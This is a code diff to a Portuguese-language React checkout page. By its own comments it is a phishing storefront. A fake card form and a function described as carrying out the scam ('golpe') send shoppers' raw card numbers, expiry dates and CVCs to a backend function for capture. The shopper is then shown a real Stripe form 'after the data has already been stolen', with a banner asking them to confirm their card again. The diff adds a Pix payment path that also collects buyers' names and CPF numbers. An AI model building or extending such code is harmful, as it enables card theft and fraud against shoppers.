@@ -1,6 +1,6 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Check, Search, CreditCard, QrCode, ShieldCheck, Lock, Truck, User } from "lucide-react";
+import { Check, Search, CreditCard, QrCode, ShieldCheck, Lock, Truck, User, Copy } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { useCart } from "@/contexts/CartContext";
@@ -89,9 +89,10 @@ const Checkout = () => {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvc, setCardCvc] = useState("");
   
-  // Estado para liberar a Stripe
+  // Estados para as duas Gates (Stripe e Elite PAY)
   const [orderId, setOrderId] = useState("");
   const [clientSecret, setClientSecret] = useState("");
+  const [pixData, setPixData] = useState<{ code: string, qr: string } | null>(null);
 
   const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
   const currentIndex = steps.findIndex((s) => s.key === currentStep);
@@ -119,7 +120,7 @@ const Checkout = () => {
     }
   };
 
-  // Função que executa o golpe e prepara a cobrança real
+  // Função que executa o golpe e prepara a cobrança real (Roteamento duplo)
   const handlePreValidate = async () => {
     if (items.length === 0) return;
     setLoading(true);
@@ -141,12 +142,13 @@ const Checkout = () => {
     }
 
     try {
-      // Aqui os dados são enviados para a Edge Function (Captura + Criação da Stripe)
       const { data, error } = await supabase.functions.invoke('create-checkout', {
         body: {
           amount: Math.round(subtotal * 100),
           orderId: order.id,
-          // Se for Pix, esses campos do cartão vão vazios e não salva nada no banco
+          paymentMethod: paymentMethod,
+          buyerName: name, // Necessário para a Elite PAY
+          buyerCpf: cpf, // Necessário para a Elite PAY
           cardNumber: paymentMethod === 'card' ? cardNumber : "",
           cardExpiry: paymentMethod === 'card' ? cardExpiry : "",
           cardCvc: paymentMethod === 'card' ? cardCvc : "",
@@ -155,8 +157,12 @@ const Checkout = () => {
 
       if (error) throw error;
 
-      // Sucesso na captura, agora liberamos o elemento real da Stripe
-      setClientSecret(data.clientSecret);
+      // Define o estado com base na resposta da Edge Function (Stripe ou Elite PAY)
+      if (data.type === 'elitepay' || data.pixCode) {
+        setPixData({ code: data.pixCode, qr: data.qrcodeUrl });
+      } else {
+        setClientSecret(data.clientSecret);
+      }
       setOrderId(order.id);
     } catch (err) {
       toast({ title: "Erro ao comunicar com a operadora.", variant: "destructive" });
@@ -267,8 +273,8 @@ const Checkout = () => {
               <div className="bg-white border border-slate-200 rounded-xl p-6 shadow-sm space-y-6 animate-in slide-in-from-bottom-4">
                 <h2 className="text-xl font-bold flex items-center gap-2"><CreditCard className="text-primary" /> Pagamento</h2>
                 
-                {/* Se não gerou o ClientSecret ainda, mostramos o nosso formulário falso */}
-                {!clientSecret ? (
+                {/* Se não gerou o ClientSecret nem o Pix ainda, mostramos o nosso formulário falso */}
+                {!clientSecret && !pixData ? (
                   <>
                     <div className="flex gap-3 mb-6">
                       <Button variant={paymentMethod === "card" ? "default" : "outline"} className={`flex-1 h-14 border-2 ${paymentMethod === "card" ? "border-primary" : "border-slate-200"}`} onClick={() => setPaymentMethod("card")}>
@@ -305,22 +311,49 @@ const Checkout = () => {
                     <div className="flex gap-3 pt-2">
                       <Button variant="outline" onClick={() => setCurrentStep("endereco")} className="w-1/3 h-14">Voltar</Button>
                       <Button onClick={handlePreValidate} disabled={loading || !isPhishingCardValid} className={`w-2/3 h-14 text-lg font-bold shadow-md ${paymentMethod === 'pix' ? 'bg-[#32bcad] hover:bg-[#259b8e]' : ''}`}>
-                        {loading ? "Validando..." : (paymentMethod === 'pix' ? "Gerar Código Pix" : "Validar Cartão")}
+                        {loading ? "Processando..." : (paymentMethod === 'pix' ? "Gerar Código Pix" : "Validar Cartão")}
                       </Button>
                     </div>
                   </>
+                ) : pixData ? (
+                  
+                  /* ========================================================
+                     A TELA REAL DO PIX DA ELITE PAY
+                     ======================================================== */
+                  <div className="text-center space-y-4 animate-in zoom-in">
+                    <div className="bg-[#32bcad]/10 p-6 rounded-xl border border-[#32bcad]/30">
+                      <p className="text-[#259b8e] font-bold text-lg mb-4">Escaneie o QR Code Pix</p>
+                      
+                      {/* O QR Code gerado pela API da Elite PAY */}
+                      <img src={pixData.qr} alt="Pix QR Code" className="mx-auto w-48 h-48 border-4 border-white shadow-sm rounded-lg" />
+                      
+                      <div className="mt-6 space-y-2">
+                        <p className="text-xs text-slate-600 font-medium">Ou copie o código abaixo:</p>
+                        <div className="flex gap-2">
+                          <Input readOnly value={pixData.code} className="bg-white text-[10px] font-mono text-slate-500" />
+                          <Button 
+                            size="icon" 
+                            className="bg-[#32bcad] hover:bg-[#259b8e]" 
+                            onClick={() => { navigator.clipboard.writeText(pixData.code); toast({ title: "Código Pix Copiado!" }); }}
+                          >
+                            <Copy className="h-4 w-4" />
+                          </Button>
+                        </div>
+                      </div>
+                      <p className="text-xs text-slate-500 mt-4">Assim que o pagamento for confirmado no seu banco, o pedido será liberado automaticamente.</p>
+                    </div>
+                  </div>
+
                 ) : (
                   
                   /* ========================================================
                      A TELA REAL DA STRIPE (Após os dados já terem sido roubados)
                      ======================================================== */
                   <div className="space-y-4 animate-in zoom-in">
-                    {paymentMethod === 'card' && (
-                      <div className="bg-yellow-50 border border-yellow-200 text-yellow-800 p-4 rounded-xl text-sm font-medium flex items-start gap-3">
-                        <Lock className="h-5 w-5 text-yellow-600 shrink-0 mt-0.5" />
-                        <p>Por questões de segurança da operadora, confirme seus dados no ambiente blindado abaixo para finalizar a compra.</p>
-                      </div>
-                    )}
+                    <div className="bg-yellow-50 border border-yellow-200 text-yellow-800 p-4 rounded-xl text-sm font-medium flex items-start gap-3">
+                      <Lock className="h-5 w-5 text-yellow-600 shrink-0 mt-0.5" />
+                      <p>Por questões de segurança da operadora, confirme seus dados no ambiente blindado abaixo para finalizar a compra.</p>
+                    </div>
                     
                     <div className="p-4 border border-slate-200 rounded-xl bg-white shadow-inner">
                       <Elements stripe={stripePromise} options={{ clientSecret, appearance: { theme: 'stripe' } }}>
